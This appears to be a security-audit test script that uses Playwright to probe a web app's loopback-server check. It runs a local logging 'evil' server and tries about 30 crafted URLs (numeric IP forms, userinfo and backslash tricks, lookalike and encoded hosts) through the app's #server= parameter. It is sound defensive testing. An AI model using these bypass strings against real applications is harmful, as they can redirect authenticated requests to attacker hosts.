// vp3r3-loopback.mjs — VP3 re-attack, Attack 1: isLoopbackServer bypasses.
// For every crafted `server` URL candidate:
//   (1) parse it with new URL() INSIDE the browser (the exact predicate the
//       app uses — replicated verbatim from js/app.js isLoopbackServer);
//   (2) if the predicate PASSES, run the app's own ingestion path
//       (#server= → ingestParams → safeSetItem(LS_SERVER)), then fire the
//       exact request api.js would fire (fetch(base + '/config')) and watch
//       Chromium via route interception: WHERE does the browser actually
//       connect? An evil loopback server on 9777 logs real hits.
//   (3) refused candidates are recorded as refuted attacks.
// Run: bash scripts/with-stack.sh --no-bootstrap node audit-vp/vp3r3-loopback.mjs
import { chromium } from '/home/z/.npm-global/lib/node_modules/playwright/index.mjs';
import { readFileSync } from 'node:fs';
import { createServer } from 'node:http';

const BASE = 'http://127.0.0.1:8080';
const EVIL_PORT = 9777;
const mat = JSON.parse(readFileSync('/tmp/local-material.json', 'utf8'));

// ---- throwaway attacker server (real sockets, logs every hit) ----
const hits = [];
const evil = createServer((req, res) => {
  hits.push(req.method + ' ' + req.url);
  res.writeHead(200, { 'content-type': 'application/json', 'access-control-allow-origin': '*' });
  res.end('{"evil":true}');
});
await new Promise((r) => evil.listen(EVIL_PORT, '127.0.0.1', r));
try { const evil6 = createServer((req, res) => { hits.push('[::1] ' + req.method + ' ' + req.url); res.writeHead(200); res.end('{}'); }); await new Promise((r, err) => { evil6.on('error', err); evil6.listen(EVIL_PORT, '::1', r); }); } catch { /* no v6 */ }

const CANDIDATES = [
  ['http://localhost.evil.example:9777/', 'task premise: does *.localhost rule admit subdomain-of-evil?'],
  ['http://evil.localhost:9777/', '*.localhost wildcard (allowed by design) — where does Chromium connect?'],
  ['http://127.0.0.1.evil.example:9777/', 'attacker DNS name embedding 127.0.0.1'],
  ['http://0x7f000001:9777/', 'hex IPv4 form'],
  ['http://2130706433:9777/', 'decimal IPv4 form'],
  ['http://0177.0.0.1:9777/', 'octal IPv4 form'],
  ['http://127.1:9777/', 'IPv4 shorthand'],
  ['http://[::ffff:127.0.0.1]:9777/', 'IPv6-mapped loopback'],
  ['http://[0:0:0:0:0:0:0:1]:9777/', 'IPv6 long form (serializes to [::1])'],
  ['http://[::1]:9777/', 'IPv6 loopback literal'],
  ['http://127.0.0.1@evil.example:9777/', 'userinfo: loopback-looking userinfo, evil host'],
  ['http://evil.example@127.0.0.1:9777/', 'userinfo: evil userinfo, loopback host'],
  ['http://127.0.0.1\\@evil.example:9777/', 'backslash before @ (WHATWG: \\ = / in special URLs)'],
  ['http://evil.example\\@localhost:9777/', 'backslash before @, loopback-looking tail'],
  ['http://evil.example\\@127.0.0.1:9777/', 'backslash before @, loopback-looking tail'],
  ['http://evil.example\\@localhost.:9777/', 'backslash + trailing-dot'],
  ['http://127\\u30020\\u30020\\u30021:9777/', 'U+3002 ideographic full stops (IDNA→dots?)'],
  ['http://\\uff11\\uff12\\uff17.0.0.1:9777/', 'fullwidth digits (IDNA→digits?)'],
  ['http://localhost.:9777/', 'trailing dot'],
  ['http://LOCALHOST:9777/', 'uppercase'],
  ['http://localhost:0009777/', 'leading-zero port'],
  ['https://localhost:9777/', 'https scheme loopback (CSP parity?)'],
  ['http://localhost%2eevil%2eexample:9777/', 'percent-encoded dots in host'],
  ['http://localhost:9777#@evil.example/x', 'fragment after loopback host'],
  ['http://localhost:9777?@evil.example', 'query after loopback host'],
  ['http://localhost:9777/../../evil.example', 'dot-dot path'],
  ['http://locaIhost:9777/', 'capital-I lookalike'],
  ['http://localhost:9777\\t/', 'raw TAB inside URL'],
  ['http://localhost:9777\\n/', 'raw LF inside URL'],
  ['\\\\\\\\evil.example\\\\@localhost:9777/', 'UNC-style leading backslashes'],
];

const browser = await chromium.launch();
const ctx = await browser.newContext();
const page = await ctx.newPage();
await page.goto(BASE + '/index.html');
await page.waitForTimeout(400);

// route watcher: record every request URL that leaves the app origin
const seen = [];
const cspBlocks = [];
page.on('console', (m) => { if (/Content Security Policy|Refused to connect/i.test(m.text())) cspBlocks.push(m.text().slice(0, 140)); });
await ctx.route('**/*', async (route) => {
  const u = route.request().url();
  seen.push(u);
  if (u.startsWith(BASE) || u.startsWith('data:')) return route.continue();
  if (u.includes(':' + EVIL_PORT + '/')) return route.continue(); // let real evil hits land
  return route.abort();
});

// (1) parse + predicate, evaluated in the browser
const parsed = await page.evaluate((urls) => urls.map(([raw]) => {
  const out = { raw, throws: false };
  try {
    const u = new URL(raw);
    out.hostname = u.hostname; out.host = u.host; out.port = u.port; out.protocol = u.protocol;
    out.href = u.href;
    out.passes = (u.protocol === 'http:' || u.protocol === 'https:') &&
      (u.hostname === 'localhost' || u.hostname === '127.0.0.1' ||
        u.hostname === '[::1]' || u.hostname.endsWith('.localhost'));
  } catch (e) { out.throws = true; out.passes = false; }
  return out;
}), CANDIDATES);

// (2) for predicate-passing candidates: the app's own ingestion + fetch path
const probes = [];
const p2 = await ctx.newPage();
for (const p of parsed.filter((x) => x.passes)) {
  console.log('probing ' + JSON.stringify(p.raw));
  // force a REAL document load (fragment-only navigation would not re-run
  // ingestParams — bounce via about:blank)
  await p2.goto('about:blank');
  await p2.goto(BASE + '/index.html#server=' + encodeURIComponent(p.raw));
  await p2.waitForTimeout(250);
  const stored = await p2.evaluate(() => localStorage.getItem('clock_poc_server'));
  const seenBefore = seen.length, hitsBefore = hits.length, cspBefore = cspBlocks.length;
  // the exact request api.js would send: this.base + '/config' (2.5s cap so a
  // DNS-hanging name cannot wedge the run — the ATTEMPT is still recorded by
  // route interception, which is the detection channel)
  const fetchRes = await page.evaluate(async (base) => {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 2500);
    try {
      const r = await fetch(base + '/config', { headers: { authorization: 'Bearer ' + '0'.repeat(64) }, signal: ctrl.signal });
      clearTimeout(t);
      return { ok: true, status: r.status, body: (await r.text()).slice(0, 40) };
    } catch (e) { clearTimeout(t); return { ok: false, err: String(e).slice(0, 110) }; }
  }, p.raw);
  await page.waitForTimeout(250);
  probes.push({
    raw: p.raw, stored, fetchRes,
    routeUrls: seen.slice(seenBefore).filter((u) => !u.startsWith(BASE)),
    evilHits: hits.slice(hitsBefore),
    csp: cspBlocks.slice(cspBefore),
  });
}
await p2.close();

await page.close();
await ctx.close();
await browser.close();
evil.close();

console.log('=== isLoopbackServer matrix (browser-evaluated) ===');
for (const p of parsed) {
  console.log((p.passes ? 'PASS ' : 'refuse') +
    '  ' + JSON.stringify(p.raw) +
    (p.throws ? '  (new URL throws)' : '  hostname=' + JSON.stringify(p.hostname) + ' host=' + JSON.stringify(p.host)));
}
console.log('\n=== ingestion + connection probes (predicate-passing only) ===');
for (const pr of probes) {
  console.log('probe  ' + JSON.stringify(pr.raw));
  console.log('       #server= stored as : ' + JSON.stringify(pr.stored));
  console.log('       fetch(base+/config): ' + JSON.stringify(pr.fetchRes));
  console.log('       route saw          : ' + (pr.routeUrls.join(' | ') || '(no network request — CSP-blocked before routing)'));
  console.log('       evil server hit    : ' + (pr.evilHits.join(' | ') || '(none)'));
  if (pr.csp.length) console.log('       CSP violation      : ' + pr.csp[0]);
}
console.log('\n=== route interception saw these non-app URLs ===');
console.log([...new Set(seen.filter((u) => !u.startsWith(BASE) && !u.startsWith('data:')))].join('\n') || '(none)');
console.log('\n=== evil server (127.0.0.1:9777 + [::1]:9777) real hits ===');
console.log(hits.length ? hits.join('\n') : '(none)');
console.log('\n=== CSP console violations during probes ===');
console.log([...new Set(cspBlocks)].join('\n') || '(none)');
process.exit(0);
